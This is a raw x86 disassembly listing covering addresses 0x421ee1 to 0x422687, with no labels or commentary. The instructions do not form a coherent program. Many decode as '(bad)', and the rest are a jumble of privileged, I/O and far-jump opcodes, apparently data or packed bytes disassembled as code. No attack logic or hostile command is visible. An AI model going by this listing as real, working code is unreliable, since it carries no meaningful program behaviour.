  421ee1:	add    esi,DWORD PTR ds:[ecx+0x1235de42]
  421ee8:	add    edi,ecx
  421eea:	mov    esi,0xe9f4deea
  421eef:	fisttp QWORD PTR [eax+0xa]
  421ef2:	sub    ecx,esi
  421ef4:	adc    dl,dl
  421ef6:	fimul  WORD PTR [edi+0x95be8f4]
  421efc:	and    esi,edx
  421efe:	push   esi
  421eff:	jle    0x421e85
  421f01:	and    ebp,DWORD PTR [esi-0x9]
  421f04:	sub    DWORD PTR [eax],ebx
  421f06:	mov    esp,0x934f94fc
  421f0b:	nop
  421f0c:	je     0x421f7c
  421f0e:	ss inc edx
  421f10:	push   ss
  421f11:	jnp    0x421f42
  421f13:	xor    BYTE PTR [esi],al
  421f15:	in     al,0xad
  421f17:	sub    bl,BYTE PTR [ebp-0x42ac017f]
  421f1d:	rcl    ebp,0x6c
  421f20:	sbb    esi,DWORD PTR [esi]
  421f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f23:	push   ebx
  421f24:	pushf  
  421f25:	leave  
  421f26:	sbb    esi,DWORD PTR [eax]
  421f28:	jg     0x421ec2
  421f2a:	and    eax,0xbd704ec2
  421f2f:	popa   
  421f30:	int    0x97
  421f32:	aam    0xab
  421f34:	adc    dh,dh
  421f36:	bound  edi,QWORD PTR [ebp+0x76e9f006]
  421f3c:	cmp    dl,BYTE PTR [edx-0x12d14d88]
  421f42:	fs repnz xor ecx,DWORD PTR cs:[edx+edx*2+0x4da22c16]
  421f4c:	shl    DWORD PTR [esp+ecx*1-0x12b02a10],cl
  421f53:	or     al,0x4c
  421f55:	loop   0x421fb1
  421f57:	jmp    0x421f35
  421f59:	test   al,0xb5
  421f5b:	sbb    edi,edi
  421f5d:	push   0xffffffad
  421f5f:	push   ebp
  421f60:	pop    edx
  421f61:	dec    ecx
  421f62:	add    dh,dh
  421f64:	push   esi
  421f65:	jp     0x421f0b
  421f67:	bound  ebx,QWORD PTR [ebx+0x43f41129]
  421f6d:	push   edx
  421f6e:	mov    ah,0x7
  421f70:	pop    esi
  421f71:	out    0x18,al
  421f73:	icebp  
  421f74:	inc    ecx
  421f76:	pop    ds
  421f77:	push   ecx
  421f78:	outs   dx,BYTE PTR ds:[esi]
  421f79:	xchg   edx,eax
  421f7a:	adc    al,0xc7
  421f7c:	cmp    al,BYTE PTR [ecx]
  421f7e:	dec    esi
  421f7f:	pop    ds
  421f80:	dec    edi
  421f81:	sub    DWORD PTR [ebx-0x35b4456],0x6f7c975d
  421f8b:	mov    ah,0x28
  421f8d:	scas   al,BYTE PTR es:[edi]
  421f8e:	adc    ebx,ebx
  421f90:	imul   edx,DWORD PTR [eax-0x6c],0xffffffbf
  421f94:	cmp    DWORD PTR [eax+0x1],ebx
  421f97:	xchg   edi,eax
  421f98:	xchg   BYTE PTR [esi],dh
  421f9a:	stc    
  421f9b:	iret   
  421f9c:	fistp  DWORD PTR ds:0x13cc2802
  421fa2:	inc    ebp
  421fa3:	sbb    al,0x79
  421fa5:	dec    esi
  421fa6:	xchg   BYTE PTR [edi-0x7d8d0a77],bl
  421fac:	icebp  
  421fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fae:	gs into 
  421fb0:	mov    esi,0xe4efe67b
  421fb5:	js     0x421faa
  421fb7:	jno    0x421f67
  421fb9:	ins    DWORD PTR es:[edi],dx
  421fba:	sub    DWORD PTR [edx],eax
  421fbc:	sub    edx,DWORD PTR [edx]
  421fbe:	rep stos BYTE PTR es:[edi],al
  421fc0:	inc    eax
  421fc1:	iret   
  421fc2:	mov    ah,BYTE PTR [esi-0x47]
  421fc5:	hlt    
  421fc6:	pop    ecx
  421fc7:	icebp  
  421fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fc9:	sub    BYTE PTR [esi],bl
  421fcb:	retf   0x7263
  421fce:	das    
  421fcf:	xor    eax,0x4ac9957c
  421fd4:	(bad)  
  421fd5:	mov    ebx,0xcc0945a4
  421fda:	mov    edx,0x8e7b25ef
  421fdf:	ror    BYTE PTR [eax+0x751fdcfc],1
  421fe5:	cdq    
  421fe6:	ret    0x5292
  421fe9:	inc    esi
  421fea:	mov    edx,0xd1a6fde1
  421fef:	jl     0x421ff7
  421ff1:	rcr    al,1
  421ff3:	push   eax
  421ff4:	fisttp DWORD PTR [ebp+0xb]
  421ff7:	mov    ah,0x39
  421ff9:	mov    al,0x8b
  421ffb:	leave  
  421ffc:	in     eax,dx
  421ffd:	retf   
  421ffe:	pop    ecx
  421fff:	sbb    al,BYTE PTR [edi+edi*4-0x12]
  422003:	sbb    edi,edx
  422005:	fidivr WORD PTR [esi-0x53fb14a1]
  42200b:	xor    al,0x40
  42200d:	mov    ds:0x8849cf00,al
  422012:	pushf  
  422013:	inc    ecx
  422014:	xchg   edi,eax
  422015:	xchg   edx,eax
  422016:	pop    ss
  422017:	fistp  QWORD PTR [edx]
  422019:	pop    ecx
  42201a:	dec    eax
  42201b:	arpl   ax,sp
  42201d:	xor    eax,0xa2709b40
  422022:	xchg   edx,eax
  422023:	scas   eax,DWORD PTR es:[edi]
  422024:	lahf   
  422025:	rcr    DWORD PTR [esi],1
  422027:	ins    DWORD PTR es:[edi],dx
  422028:	(bad)  
  422029:	xchg   edi,eax
  42202a:	adc    ah,BYTE PTR [esi+ebp*2+0x5a7cd44]
  422031:	sub    al,0xb1
  422033:	test   DWORD PTR [edx-0x3],eax
  422036:	test   DWORD PTR [esi],0xedb0af1d
  42203c:	or     esp,DWORD PTR gs:[eax]
  42203f:	fs ins DWORD PTR es:[edi],dx
  422041:	xchg   ecx,eax
  422042:	gs call 0x30a3:0xc0ac7a66
  42204a:	lds    ebp,FWORD PTR cs:[ebx+0x47]
  42204e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42204f:	cld    
  422050:	cmp    esi,edi
  422052:	ds and al,0x4d
  422055:	repz je 0x42202d
  422058:	pop    esp
  422059:	adc    al,0xe9
  42205b:	repnz dec esi
  42205d:	push   ss
  42205e:	or     BYTE PTR [edi],bh
  422060:	jmp    0x421fe8
  422062:	xchg   ebp,eax
  422063:	xor    DWORD PTR [edx+0x49d2a1fb],edi
  422069:	shl    al,cl
  42206b:	pop    ds
  42206c:	push   ss
  42206d:	push   ss
  42206e:	je     0x422098
  422070:	xchg   esp,eax
  422071:	cmp    eax,DWORD PTR [esi-0x2f]
  422074:	push   0xf7658a40
  422079:	outs   dx,BYTE PTR ds:[esi]
  42207a:	int    0x0
  42207c:	pop    esi
  42207d:	outs   dx,BYTE PTR ds:[esi]
  42207e:	inc    esp
  42207f:	and    al,0x75
  422081:	inc    ebx
  422082:	cmp    BYTE PTR [esi],dh
  422084:	sbb    ecx,edx
  422086:	or     eax,0x22d3e5c
  42208b:	stc    
  42208c:	inc    esi
  42208d:	dec    edx
  42208e:	dec    DWORD PTR [eax]
  422090:	int3   
  422091:	xor    eax,0x2014a2cf
  422096:	xchg   cl,bh
  422098:	int3   
  422099:	rcr    DWORD PTR [edi-0x6a11353],1
  42209f:	sub    al,BYTE PTR [ecx-0x2c]
  4220a2:	into   
  4220a3:	mov    dh,0xbb
  4220a5:	cmp    eax,0x21e01ca9
  4220aa:	pop    esp
  4220ab:	cli    
  4220ac:	in     al,0x92
  4220ae:	ss pop esi
  4220b0:	lahf   
  4220b1:	add    bh,BYTE PTR [ebx]
  4220b3:	loop   0x42209e
  4220b5:	cdq    
  4220b6:	add    ch,0x2b
  4220b9:	mov    ch,0xbe
  4220bb:	pop    ecx
  4220bc:	out    dx,al
  4220bd:	je     0x422128
  4220bf:	xor    BYTE PTR [eax],ah
  4220c1:	dec    ecx
  4220c2:	mov    BYTE PTR ds:0xb7e0038,cl
  4220c8:	push   esp
  4220c9:	ja     0x4220ae
  4220cb:	and    edx,edi
  4220cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ce:	imul   edi,DWORD PTR [ebx-0x77],0xa8e976a9
  4220d5:	jecxz  0x42212d
  4220d7:	icebp  
  4220d8:	lods   eax,DWORD PTR ds:[esi]
  4220d9:	ss aas 
  4220db:	call   0xada5:0xe2031bf4
  4220e2:	fst    DWORD PTR [eax+0x68]
  4220e5:	jbe    0x4220ba
  4220e7:	sbb    ecx,DWORD PTR [eax]
  4220e9:	sub    eax,0x7e13e410
  4220ee:	dec    ecx
  4220ef:	jne    0x422110
  4220f1:	mov    ah,0x19
  4220f3:	xor    ch,BYTE PTR [ebx]
  4220f5:	mov    ds:0x31d9d2,eax
  4220fa:	stos   BYTE PTR es:[edi],al
  4220fb:	xor    al,0xed
  4220fd:	jg     0x4220cc
  4220ff:	lahf   
  422100:	pop    ebp
  422101:	cmp    DWORD PTR [ecx+0x39],ecx
  422104:	stos   DWORD PTR es:[edi],eax
  422105:	pop    eax
  422106:	inc    DWORD PTR [ebx]
  422108:	push   0xffffffec
  42210a:	adc    ebp,DWORD PTR [edi+0x7b9b39c5]
  422110:	int3   
  422111:	push   ds
  422112:	push   esi
  422113:	cmp    BYTE PTR [ecx+0x6c],dl
  422116:	dec    edi
  422117:	jae    0x422119
  422119:	clc    
  42211a:	xchg   ebx,eax
  42211b:	cmp    ah,BYTE PTR [edi+0x1c5d10f3]
  422121:	fidivr WORD PTR [ebp+ecx*2+0x54]
  422125:	dec    ecx
  422126:	push   ds
  422127:	add    DWORD PTR [edi+edx*4-0x62],edi
  42212b:	and    ah,al
  42212d:	sbb    al,BYTE PTR [ecx]
  42212f:	pop    edx
  422130:	add    eax,0x2ad34624
  422135:	repz mov bl,ch
  422138:	retf   
  422139:	xchg   BYTE PTR [eax-0x1c],al
  42213c:	cmp    DWORD PTR [ebp-0x4d93b68b],edi
  422142:	pop    ebx
  422143:	(bad)  [edi-0x20]
  422146:	xor    BYTE PTR [esi-0x12f2377a],ch
  42214c:	or     ah,dh
  42214e:	arpl   bx,cx
  422150:	sbb    eax,0x6de650f1
  422155:	out    0x38,eax
  422157:	shl    DWORD PTR [ecx+0x5645ceb],0x37
  42215e:	mov    ds:0x347e5a46,eax
  422163:	dec    ecx
  422164:	sub    BYTE PTR [esi+0x32447265],bh
  42216a:	loop   0x422118
  42216c:	mov    ebx,0xbec8968c
  422171:	pop    eax
  422172:	or     dh,BYTE PTR [eax-0x753245f6]
  422178:	lea    esi,[eax-0x2e0eef4a]
  42217e:	aam    0xf4
  422180:	dec    esi
  422181:	ror    DWORD PTR [esi-0x24a8d6e0],0xde
  422188:	test   al,0x0
  42218a:	push   ecx
  42218b:	or     al,0xc8
  42218d:	ret    
  42218e:	jmp    DWORD PTR [ebp+0x57]
  422191:	or     al,0x90
  422193:	inc    ecx
  422194:	das    
  422195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422196:	fsubr  QWORD PTR [esi]
  422198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422199:	inc    esp
  42219a:	test   BYTE PTR [eax+edx*8+0x36],dl
  42219e:	xor    eax,0x6c1a6fff
  4221a3:	lods   al,BYTE PTR ds:[esi]
  4221a4:	add    eax,0x66ed4554
  4221a9:	stc    
  4221aa:	and    DWORD PTR [edx],ecx
  4221ac:	inc    esp
  4221ad:	scas   al,BYTE PTR es:[edi]
  4221ae:	xchg   ebp,eax
  4221af:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221b1:	pushf  
  4221b2:	mov    ebx,0x7d1dff93
  4221b7:	cmp    eax,0xf33b5fcb
  4221bc:	repz add BYTE PTR [ebx],dh
  4221bf:	dec    eax
  4221c0:	int    0xcb
  4221c2:	jns    0x422191
  4221c4:	sbb    DWORD PTR [edi-0x4e6937ea],esi
  4221ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221cb:	push   0x36c30eb
  4221d0:	sti    
  4221d1:	cld    
  4221d2:	jno    0x422205
  4221d4:	xor    DWORD PTR [eax+eax*2],ebx
  4221d7:	sub    ecx,eax
  4221d9:	outs   dx,BYTE PTR ds:[esi]
  4221da:	fsubr  DWORD PTR [edx]
  4221dc:	repnz call 0xeaee:0xbe93
  4221e3:	lods   al,BYTE PTR ds:[esi]
  4221e4:	sub    BYTE PTR [ebx-0x3b],ah
  4221e7:	jg     0x4221f3
  4221e9:	mov    ?,WORD PTR [eax]
  4221eb:	into   
  4221ec:	push   ds
  4221ed:	mov    esp,0xa03dd93
  4221f2:	inc    eax
  4221f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221f4:	ja     0x422193
  4221f6:	(bad)  [ebx-0x3]
  4221f9:	xchg   esi,eax
  4221fa:	xchg   BYTE PTR [edi-0x7],bl
  4221fd:	cmp    dh,ch
  4221ff:	inc    esi
  422200:	ja     0x4221fa
  422202:	cmc    
  422203:	mov    ecx,0xced6740
  422208:	in     eax,dx
  422209:	jge    0x4221f9
  42220b:	fcom   DWORD PTR [esi]
  42220d:	data16 fld QWORD PTR [ebx]
  422210:	ret    0x8a2
  422213:	imul   ebx,DWORD PTR [eax+ecx*2-0x26],0x68
  422218:	mov    ah,0x5d
  42221a:	aam    0x27
  42221c:	aad    0x42
  42221e:	cmp    eax,0x47250346
  422223:	shl    ecx,0x5
  422226:	popf   
  422227:	adc    eax,0x555d0aec
  42222c:	nop
  42222d:	nop
  42222e:	mov    dl,0x40
  422230:	or     eax,0x39152ec8
  422235:	jb     0x4221d0
  422237:	mov    dh,0x4e
  422239:	inc    esp
  42223a:	cdq    
  42223b:	and    DWORD PTR [edx+0x34],edi
  42223e:	pop    es
  42223f:	pop    ss
  422240:	sub    DWORD PTR [ecx+0x7e],esp
  422243:	int3   
  422244:	xchg   DWORD PTR [eax+0x3d],ecx
  422247:	leave  
  422248:	rol    DWORD PTR [edx-0x1d],0xe9
  42224c:	or     BYTE PTR [edx],cl
  42224e:	or     eax,0x1a910c86
  422253:	iret   
  422254:	add    esi,DWORD PTR [ebx]
  422256:	push   esp
  422257:	(bad)  
  422259:	mov    BYTE PTR [ecx],al
  42225b:	jno    0x5779a9a0
  422261:	ficomp DWORD PTR [ebp+0x6d1c9d63]
  422267:	mov    es,ebp
  422269:	(bad)  
  42226a:	adc    al,0x4e
  42226c:	jb     0x4222d0
  42226e:	enter  0xfe5c,0x63
  422272:	adc    DWORD PTR [edx-0x5d21e351],edx
  422278:	test   al,0x65
  42227a:	jno    0x4222ae
  42227c:	and    al,0xb
  42227e:	sbb    eax,0x1fb8a2eb
  422283:	push   edi
  422284:	push   ds
  422285:	(bad)  
  422286:	mov    esp,0x7cd2c6ad
  42228b:	fmulp  st(0),st
  42228d:	shr    cl,1
  42228f:	mov    BYTE PTR [esi],ch
  422291:	arpl   WORD PTR [edi],si
  422293:	hlt    
  422294:	push   edx
  422295:	and    edx,esp
  422297:	fnstsw WORD PTR [esi]
  422299:	fadd   QWORD PTR [esi]
  42229b:	jb     0x422293
  42229d:	retf   
  42229e:	ss test cl,bh
  4222a1:	cwde   
  4222a2:	push   eax
  4222a3:	lock add ebp,DWORD PTR [edi+0x7c7bb381]
  4222aa:	pop    esp
  4222ab:	mov    ebp,0x1a315403
  4222b0:	or     DWORD PTR [edx-0x6daeef34],eax
  4222b6:	push   esi
  4222b7:	inc    ebp
  4222b8:	nop    DWORD PTR [edx-0x62]
  4222bc:	scas   eax,DWORD PTR es:[edi]
  4222bd:	lods   al,BYTE PTR ds:[esi]
  4222be:	dec    esi
  4222bf:	imul   ebp,DWORD PTR [edx-0x5b2244a2],0xffffffb2
  4222c6:	ret    
  4222c7:	cmp    DWORD PTR [edx-0x35967a2e],0xffffffdf
  4222ce:	retf   
  4222cf:	adc    DWORD PTR [eax],ebp
  4222d1:	les    esi,FWORD PTR [edi-0x2fc7f727]
  4222d7:	stos   DWORD PTR es:[edi],eax
  4222d8:	iret   
  4222d9:	inc    ecx
  4222da:	xchg   BYTE PTR [ebx],al
  4222dc:	pop    esp
  4222dd:	jmp    0x651a30c3
  4222e2:	stos   BYTE PTR es:[edi],al
  4222e3:	mov    bl,0xd2
  4222e5:	retf   0x9c78
  4222e8:	int    0x62
  4222ea:	jecxz  0x422331
  4222ec:	dec    eax
  4222ed:	mov    esp,0x285d228a
  4222f2:	aaa    
  4222f3:	push   ds
  4222f4:	popa   
  4222f5:	cmp    ecx,ebx
  4222f7:	mov    ds:0x30f5e1cd,al
  4222fc:	adc    eax,0xdc7f11f8
  422301:	sub    BYTE PTR [ebp-0x5ee98e9],ah
  422307:	imul   DWORD PTR [ecx+ecx*8-0x11]
  42230b:	mov    ah,0x63
  42230d:	push   ebx
  42230e:	sub    eax,0xb2e0fdc2
  422313:	imul   ebx,ebp,0xffffffca
  422316:	jbe    0x4222e7
  422318:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42231a:	xor    DWORD PTR [eax+0x65],eax
  42231d:	and    eax,0x92f7e53c
  422322:	push   es
  422323:	mov    BYTE PTR [ebx-0x1bc9766e],dh
  422329:	mov    esi,0x93141ac1
  42232e:	lock dec ecx
  422330:	jmp    0x35b8:0x9dfbd51
  422337:	add    al,0x86
  422339:	xchg   DWORD PTR [ebx+0x66],eax
  42233c:	xlat   BYTE PTR ds:[ebx]
  42233d:	xor    ecx,DWORD PTR [edx+0x41]
  422340:	lds    eax,FWORD PTR [ebp-0x34e1921c]
  422346:	repnz pop edi
  422348:	pop    eax
  422349:	fild   WORD PTR [ebx]
  42234b:	inc    ebp
  42234c:	push   eax
  42234d:	mov    bl,0xa6
  42234f:	popf   
  422350:	pop    ds
  422351:	add    BYTE PTR [edx+ebx*8],dl
  422354:	or     bh,BYTE PTR [ecx-0x7b]
  422357:	adc    BYTE PTR [esi+0x48],al
  42235a:	add    esi,ecx
  42235c:	lahf   
  42235d:	mov    al,0x80
  42235f:	loope  0x422339
  422361:	in     al,dx
  422362:	enter  0x8919,0xf2
  422366:	cmp    BYTE PTR [ebx*2-0x29158c86],bh
  42236d:	into   
  42236e:	adc    eax,0xee2ccd8a
  422373:	(bad)  
  422374:	mov    eax,ds:0x91c27021
  422379:	mov    bl,0x8f
  42237b:	xor    edi,DWORD PTR [esi]
  42237d:	jbe    0x6dd6638b
  422383:	test   al,0x46
  422385:	xchg   dl,dh
  422387:	xchg   ebx,eax
  422388:	sbb    edi,DWORD PTR [ebx+edx*4]
  42238b:	loop   0x422399
  42238d:	push   edi
  42238e:	push   ss
  42238f:	and    DWORD PTR [eax+0x1d8fcdb],0xa01ae553
  422399:	cmp    BYTE PTR [eax-0x42],cl
  42239c:	xlat   BYTE PTR ds:[ebx]
  42239d:	test   al,0x25
  42239f:	repnz sbb bl,BYTE PTR [ebx]
  4223a2:	lds    ebp,FWORD PTR [eax-0x69]
  4223a5:	mov    ah,0x16
  4223a7:	pushf  
  4223a8:	xor    edx,esi
  4223aa:	gs loop 0x422382
  4223ad:	xor    BYTE PTR [esi+0x330d3a09],dl
  4223b3:	aad    0xfa
  4223b5:	lods   al,BYTE PTR ds:[esi]
  4223b6:	sub    ecx,DWORD PTR [edx+0x3f]
  4223b9:	cmp    BYTE PTR [ecx],bh
  4223bb:	pop    ecx
  4223bc:	push   0x1d49c474
  4223c1:	jnp    0x42239f
  4223c3:	mov    dl,0x53
  4223c5:	mov    esp,0x19df6dce
  4223ca:	and    ecx,eax
  4223cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223cd:	xchg   ebx,eax
  4223ce:	sbb    eax,0x3037e48e
  4223d3:	pop    esp
  4223d4:	add    BYTE PTR [edi-0x448aeaa1],cl
  4223da:	sbb    eax,0x5f97f728
  4223df:	aam    0x4a
  4223e1:	xchg   BYTE PTR [ebp+0x71],al
  4223e4:	loope  0x42245a
  4223e6:	jno    0x42238f
  4223e8:	mov    WORD PTR [edx-0x21],gs
  4223eb:	pop    ss
  4223ec:	ficom  DWORD PTR [edi+0x7413d7b8]
  4223f2:	arpl   WORD PTR [edx+0x42],si
  4223f5:	fnsave [bx+si]
  4223f8:	fiadd  DWORD PTR [ebp+0x7f]
  4223fb:	enter  0x669d,0x80
  4223ff:	xor    DWORD PTR [ebp-0x3e],edi
  422402:	pop    edx
  422403:	inc    ecx
  422404:	ror    DWORD PTR [ebp+0x3897f6fd],1
  42240a:	add    bl,ah
  42240c:	out    dx,eax
  42240d:	pop    ebp
  42240e:	je     0x4223cd
  422410:	mov    ds:0x532a29dc,al
  422415:	xor    al,0x1b
  422417:	repz retf 0x760b
  42241b:	popa   
  42241c:	sbb    esp,ebp
  42241e:	pop    ss
  42241f:	sub    dl,BYTE PTR [ebx]
  422421:	rcr    BYTE PTR [ebx-0x32bbe2bb],1
  422427:	sbb    ebx,DWORD PTR [eax-0x5c61e253]
  42242d:	shl    DWORD PTR [esi+0x584c79ae],cl
  422433:	daa    
  422434:	xor    DWORD PTR [edx],0xffffffc1
  422437:	adc    ecx,DWORD PTR [eax-0x13c15902]
  42243d:	and    BYTE PTR [eax+0x3b],0x2d
  422441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422442:	sbb    eax,0xd7caa38
  422447:	dec    DWORD PTR [ecx+0x33]
  42244a:	popf   
  42244b:	or     al,0x3d
  42244d:	(bad)  
  42244e:	cdq    
  42244f:	jge    0x422466
  422451:	xor    BYTE PTR [edx-0x77626240],ch
  422457:	(bad)  
  422458:	sahf   
  422459:	cwde   
  42245a:	push   0xfffffff4
  42245c:	das    
  42245d:	dec    ebx
  42245e:	popf   
  42245f:	sub    eax,0xe0b378f5
  422464:	and    al,0xea
  422467:	sub    ebp,DWORD PTR [eax-0x31]
  42246a:	jns    0x4224d2
  42246c:	or     cl,0x43
  42246f:	and    al,0x1
  422471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422472:	dec    edx
  422473:	mov    bl,0x5d
  422475:	sub    DWORD PTR [edi-0x474edf1a],ecx
  42247b:	xchg   ecx,eax
  42247c:	in     eax,dx
  42247d:	bnd je 0x4224dd
  422480:	(bad)  
  422481:	adc    ah,cl
  422483:	or     BYTE PTR [ebx],bl
  422485:	(bad)  
  422486:	dec    ebp
  422487:	hlt    
  422488:	jg     0x422469
  42248a:	pop    ecx
  42248b:	xor    ah,al
  42248d:	mov    eax,0xec91bdae
  422492:	xchg   edi,eax
  422493:	mov    ecx,0xffd6bd41
  422498:	std    
  422499:	lahf   
  42249a:	retf   
  42249b:	arpl   cx,bx
  42249d:	aad    0x44
  42249f:	iret   
  4224a0:	enter  0x45e7,0xe4
  4224a4:	fbld   TBYTE PTR [edi+0x2e]
  4224a7:	shr    edx,cl
  4224a9:	xchg   esp,eax
  4224aa:	sbb    ecx,ebp
  4224ac:	mov    esp,0xb18d67fa
  4224b1:	and    edi,0xffffffe8
  4224b4:	sbb    eax,0xb2500c7
  4224b9:	ins    BYTE PTR es:[edi],dx
  4224ba:	(bad)  
  4224bb:	xchg   BYTE PTR [ecx+0x1dc9bd83],cl
  4224c1:	sbb    al,BYTE PTR [ecx]
  4224c3:	outs   dx,DWORD PTR ds:[esi]
  4224c4:	and    eax,0x3a1662f7
  4224c9:	inc    ebx
  4224ca:	xor    al,0x9
  4224cc:	fistp  DWORD PTR [edx-0x4a]
  4224cf:	test   esi,esi
  4224d1:	(bad)  
  4224d2:	outs   dx,BYTE PTR ds:[esi]
  4224d3:	sub    ah,dh
  4224d5:	mov    ecx,0xa093fb8
  4224da:	shl    bl,0x56
  4224dd:	sbb    cl,bl
  4224df:	xor    ch,cl
  4224e1:	sub    esp,DWORD PTR [eax+0x7b]
  4224e4:	push   ebx
  4224e5:	cmc    
  4224e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224e7:	sub    esp,esp
  4224e9:	cmp    al,0xfa
  4224eb:	add    dl,BYTE PTR [ecx]
  4224ed:	and    DWORD PTR [edi+edx*1+0x5e5b048f],esp
  4224f4:	mov    eax,0x236cba57
  4224f9:	std    
  4224fa:	fbld   TBYTE PTR [ebx-0x1ac8c8d5]
  422500:	test   BYTE PTR [edi-0x271efe5b],bh
  422506:	pop    ss
  422507:	out    0x91,al
  422509:	int    0xd6
  42250b:	(bad)  
  42250c:	punpckhwd mm7,mm6
  42250f:	jle    0x422526
  422511:	sub    edi,DWORD PTR [edi]
  422513:	sahf   
  422514:	cmc    
  422515:	mov    ss,WORD PTR [esi+0xfb3afc9]
  42251b:	add    dl,BYTE PTR [ebx-0x39b5432c]
  422521:	jbe    0x42259e
  422523:	ins    DWORD PTR es:[edi],dx
  422524:	es push 0x7efea463
  42252a:	and    ebx,edx
  42252c:	(bad)  
  42252d:	and    al,0x52
  42252f:	out    0x38,eax
  422531:	xlat   BYTE PTR ds:[ebx]
  422532:	std    
  422533:	xchg   esp,eax
  422534:	mov    DWORD PTR [esi],edx
  422536:	fcomp  DWORD PTR [ebp-0x5494a4ae]
  42253c:	or     al,0xb0
  42253e:	mov    al,ds:0xfda3f2db
  422543:	sbb    ah,bh
  422545:	cwde   
  422546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422547:	adc    ah,dl
  422549:	or     ah,BYTE PTR [ecx]
  42254b:	or     edx,DWORD PTR [eax-0xc04a71b]
  422551:	and    esi,esp
  422553:	fs adc al,0xbd
  422556:	out    dx,al
  422557:	(bad)  
  422558:	cmp    dh,BYTE PTR [edx-0x3c69c966]
  42255e:	pop    ebx
  42255f:	jnp    0x422536
  422561:	mov    fs,WORD PTR [esi-0x7a]
  422564:	mov    bh,0x2f
  422566:	mov    ch,0x10
  422568:	test   esp,ecx
  42256a:	out    dx,eax
  42256b:	jmp    0x4225a2
  42256d:	push   esp
  42256e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42256f:	add    ebx,DWORD PTR [eax]
  422571:	fsubr  st,st(1)
  422573:	adc    eax,esp
  422575:	test   al,0x89
  422577:	pop    edi
  422578:	(bad)  
  422579:	pop    ebp
  42257a:	lds    edx,FWORD PTR [eax+0x2b]
  42257d:	leave  
  42257e:	jmp    0xad6a:0xc294e1a7
  422585:	retf   0xde55
  422588:	cs xchg dh,ah
  42258b:	call   0xf33:0x2d6a26b8
  422592:	mov    ah,0x97
  422594:	sub    eax,DWORD PTR [esi+edx*4]
  422597:	mov    cs,WORD PTR [esi-0x359da938]
  42259d:	enter  0xe8ad,0x48
  4225a1:	jmp    0x42257e
  4225a3:	xchg   esp,eax
  4225a4:	mov    ch,0x15
  4225a6:	ror    BYTE PTR [edx*8-0x20de734c],1
  4225ad:	aam    0xda
  4225af:	jb     0x42257d
  4225b1:	dec    edx
  4225b2:	sub    bh,BYTE PTR [edi+0x7a]
  4225b5:	mov    BYTE PTR [ebp-0x63],ch
  4225b8:	daa    
  4225b9:	jecxz  0x42259a
  4225bb:	(bad)  
  4225bd:	pop    ebp
  4225be:	(bad)  
  4225bf:	dec    edi
  4225c0:	stc    
  4225c1:	lds    edx,FWORD PTR [esi+0x29]
  4225c4:	aaa    
  4225c5:	shl    BYTE PTR [ebx],1
  4225c7:	xlat   BYTE PTR ds:[ebx]
  4225c8:	add    DWORD PTR [esi+edx*1+0x63],eax
  4225cc:	lahf   
  4225cd:	cmc    
  4225ce:	js     0x4225be
  4225d0:	and    DWORD PTR [esi+0x57c4b5e8],ebp
  4225d6:	dec    edx
  4225d7:	aam    0x86
  4225d9:	in     al,0xd1
  4225db:	or     DWORD PTR [eax+0xa],ecx
  4225de:	pop    ebp
  4225df:	push   eax
  4225e0:	inc    ebx
  4225e1:	sahf   
  4225e2:	xor    bh,BYTE PTR [edx+ebp*8]
  4225e5:	js     0x4225ac
  4225e7:	int3   
  4225e8:	and    ebp,esp
  4225ea:	les    esp,FWORD PTR [ebx-0x6d]
  4225ed:	retf   0xdcf8
  4225f0:	sub    eax,0x64aba19a
  4225f5:	cld    
  4225f6:	test   DWORD PTR [edi],ecx
  4225f8:	sbb    DWORD PTR gs:[esi+ecx*8+0x7325c613],0xffffff87
  422601:	aam    0x33
  422603:	inc    ecx
  422604:	and    BYTE PTR [edi],al
  422606:	jbe    0x422648
  422608:	sti    
  422609:	fs jmp 0xfd6f:0x84a2ff2
  422611:	je     0x4225a2
  422613:	mov    cl,0x76
  422615:	pop    ss
  422616:	shl    BYTE PTR [ebx+ebx*1+0x257e4ef2],1
  42261d:	into   
  42261e:	call   0xd7e0:0x612800ab
  422625:	xchg   esp,eax
  422626:	push   0x1a92d4ca
  42262b:	popa   
  42262c:	xor    DWORD PTR [edi],edx
  42262e:	loop   0x422694
  422630:	push   edi
  422631:	rol    BYTE PTR [eax+0x5b81cae9],1
  422637:	ret    0xdc48
  42263a:	in     al,dx
  42263b:	fnsave [ecx]
  42263d:	icebp  
  42263e:	mov    ch,0x10
  422640:	fcom   QWORD PTR [ecx-0x5e]
  422643:	popf   
  422644:	js     0x422606
  422646:	scas   eax,DWORD PTR es:[edi]
  422647:	sub    ch,ch
  422649:	mov    ds:0x37357fe2,eax
  42264e:	repnz xchg edx,eax
  422650:	push   ss
  422651:	add    al,BYTE PTR [eax]
  422653:	stos   BYTE PTR es:[edi],al
  422654:	and    eax,0xbacb140a
  422659:	pop    esp
  42265a:	sub    al,0x48
  42265c:	daa    
  42265d:	adc    BYTE PTR [ebp+0x7cd0c1f8],dh
  422663:	stc    
  422664:	out    dx,al
  422665:	and    al,0xdc
  422667:	jb     0x4225ed
  422669:	les    edi,FWORD PTR [ebx]
  42266b:	fucomi st,st(1)
  42266d:	fstp   QWORD PTR [ecx-0x34]
  422670:	bound  ebp,QWORD PTR ds:0xda7ad74b
  422676:	jno    0x422669
  422678:	pop    esp
  422679:	jl     0x4226bc
  42267b:	mov    edx,0xb3ed2f02
  422680:	dec    edx
  422681:	push   ds
  422682:	inc    ebp
  422683:	int3   
  422684:	iret   
  422685:	add    bl,BYTE PTR [ebx]
  422687:	jns    0x4226f6
